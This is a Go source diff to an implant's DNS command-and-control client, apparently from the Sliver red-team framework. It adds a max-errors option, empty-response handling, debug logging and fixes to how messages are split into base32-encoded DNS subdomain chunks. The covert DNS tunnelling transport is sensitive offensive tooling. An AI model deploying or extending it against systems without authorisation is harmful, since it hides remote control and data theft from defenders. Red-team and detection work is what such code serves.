@@ -91,6 +91,7 @@ var (
 	ErrClosed              = errors.New("dns session closed")
 	ErrInvalidResponse     = errors.New("invalid response")
 	ErrInvalidIndex        = errors.New("invalid start/stop index")
+	ErrEmptyResponse       = errors.New("empty response")
 )
 
 // DNSOptions - c2 specific options
@@ -98,6 +99,7 @@ type DNSOptions struct {
 	QueryTimeout      time.Duration
 	RetryWait         time.Duration
 	RetryCount        int
+	MaxErrors         int
 	WokersPerResolver int
 	ForceBase32       bool
 	ForceResolvConf   string
@@ -125,11 +127,17 @@ func ParseDNSOptions(c2URI *url.URL) *DNSOptions {
 	if err != nil || workersPerResolver < 1 {
 		workersPerResolver = 2
 	}
+	// Max errors
+	maxErrors, err := strconv.Atoi(c2URI.Query().Get("max-errors"))
+	if err != nil || maxErrors < 0 {
+		maxErrors = 10
+	}
 
 	return &DNSOptions{
 		QueryTimeout:      queryTimeout,
 		RetryWait:         retryWait,
 		RetryCount:        retryCount,
+		MaxErrors:         maxErrors,
 		WokersPerResolver: workersPerResolver,
 		ForceBase32:       strings.ToLower(c2URI.Query().Get("force-base32")) == "true",
 		ForceResolvConf:   c2URI.Query().Get("force-resolv-conf"),
@@ -436,6 +444,12 @@ func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
 	if err != nil {
 		return nil, err
 	}
+	// {{if .Config.Debug}}
+	log.Printf("[dns] read msg resp data: %v", respData)
+	// {{end}}
+	if len(respData) < 1 {
+		return nil, nil
+	}
 
 	dnsMsg := &dnspb.DNSMessage{}
 	err = proto.Unmarshal(respData, dnsMsg)
@@ -612,22 +626,29 @@ func (s *SliverDNSClient) SplitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 	stop := start
 	lastLen := 0
 	var encoded string
+	// {{if .Config.Debug}}
+	encodedSubdata := []string{}
+	// {{end}}
 	for index := 0; stop < len(data); index++ {
 		if len(data) < index {
 			panic("boundary miscalculation") // We should always be able to encode more than one byte
 		}
 		msg.Start = uint32(start)
 		if lastLen == 0 {
-			stop += int(float64(s.subdataSpace) / 2) // base32 overhead is about 160%
+			stop += int(float64(s.subdataSpace)/2) - 1 // base32 overhead is about 160%
 		} else {
 			stop += (lastLen - 4) // max start uint32 overhead
 		}
-		if len(data) < stop {
+		if len(data) <= stop {
 			stop = len(data) - 1 // make sure the loop is executed at least once
 		}
 
 		// Sometimes adding a byte will result in +2 chars so we -1 the subdata space
 		encoded = ""
+		// {{if .Config.Debug}}
+		log.Printf("[dns] encoded: %d, subdata space: %d | stop: %d, len: %d",
+			len(encoded), (s.subdataSpace - 1), stop, len(data))
+		// {{end}}
 		for len(encoded) < (s.subdataSpace-1) && stop < len(data) {
 			stop++
 			// {{if .Config.Debug}}
@@ -641,6 +662,9 @@ func (s *SliverDNSClient) SplitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 			// {{end}}
 		}
 		lastLen = len(msg.Data) // Save the amount of data that fit for the next loop
+		// {{if .Config.Debug}}
+		encodedSubdata = append(encodedSubdata, encoded)
+		// {{end}}
 		domain, err := s.joinSubdataToParent(encoded)
 		if err != nil {
 			// {{if .Config.Debug}}
@@ -651,6 +675,28 @@ func (s *SliverDNSClient) SplitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 		subdata = append(subdata, domain)
 		start = stop
 	}
+
+	// {{if .Config.Debug}}
+	total := 0
+	for index, domain := range encodedSubdata {
+		dnsMsg := &dnspb.DNSMessage{}
+		rawData, err := encoder.Decode([]byte(domain))
+		if err != nil {
+			log.Printf("[dns] decode failed: %s", err)
+			panic("failed to decode subdata")
+		}
+		proto.Unmarshal(rawData, dnsMsg)
+		total += len(dnsMsg.Data)
+		log.Printf("[dns] subdata %d (%d->%d): %d bytes",
+			index, dnsMsg.Start, int(dnsMsg.Start)+len(dnsMsg.Data), len(dnsMsg.Data))
+	}
+	log.Printf("[dns] original data: %d bytes", len(data))
+	log.Printf("[dns] total subdata: %d bytes", total)
+	if total != len(data) {
+		panic("failed to properly encode subdata")
+	}
+	// {{end}}
+
 	return subdata, nil
 }
 
